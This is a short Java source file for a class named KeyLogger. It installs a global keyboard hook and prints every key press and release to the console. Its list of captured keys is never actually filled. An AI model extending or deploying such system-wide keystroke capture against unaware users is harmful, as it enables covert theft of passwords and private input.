import java.util.Map.Entry;
import java.util.*;
import lc.kra.system.keyboard.GlobalKeyboardHook;
import lc.kra.system.keyboard.event.GlobalKeyAdapter;
import lc.kra.system.keyboard.event.GlobalKeyEvent;
public class KeyLogger implements Runnable {
    ArrayList<String> keypresses;
    boolean active;
    boolean gathering;
    public KeyLogger() {
        keypresses = new ArrayList<String>();
        active=true;
        gathering=false;
    }
    public void run() {
        GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(true);
        keyboardHook.addKeyListener(new GlobalKeyAdapter() {
        	public void keyPressed(GlobalKeyEvent event) {
        		System.out.println(event);
                }
        	public void keyReleased(GlobalKeyEvent event) {
        		System.out.println(event); 
        	}
        });
    }
    public ArrayList<String> retrieve() {
        return keypresses;
    }
    public void restart() {
        keypresses = new ArrayList<String>();
    }
}